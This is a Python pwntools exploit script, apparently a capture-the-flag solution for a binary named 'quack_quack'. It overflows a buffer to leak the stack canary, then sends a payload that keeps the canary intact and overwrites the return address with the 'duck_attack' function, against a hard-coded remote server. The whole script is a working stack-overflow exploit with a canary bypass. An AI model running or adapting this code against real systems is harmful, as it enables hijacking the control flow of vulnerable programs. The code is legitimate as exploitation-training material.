#!/usr/bin/env python3

from pwn import *

e = ELF("./quack_quack_patched")
# libc = elf('./libc.so.6')
# rop = ROP(e)

context.binary = e
context.terminal = ['tmux', 'split', '-h']


def conn():
    if args.LOCAL:
        r = process([e.path])
    elif args.GDB:
          # TODO: add break points, e.g. b *(_main + 0x12)
        r = gdb.debug([e.path], '''
                      b *(duckling + 216)
                      b *(duckling + 0x124)
                      c
                      ''')
    else:
        r = remote('154.57.164.75', '31964')

    return r


def main():
    r = conn()

    r.sendlineafter(b'>', 0x59 * b'a' + b'Quack Quack ')
    data = r.recvuntil(b'>')
    canary = u64(data[13:20].rjust(8, b'\00'))
    success(f'The canary is {hex(canary)}')
    e.address = 0x0000000000400000
    duck_attack = e.symbols['duck_attack']
    success(f'duck_attack is at {hex(duck_attack)}')
    payload = flat(
            {0x58:[
                canary,
                0, # rbp
                duck_attack,
                ]}, filler=b'\x90'
            )
    r.sendline(payload)

    r.interactive()

if __name__ == "__main__":
    main()
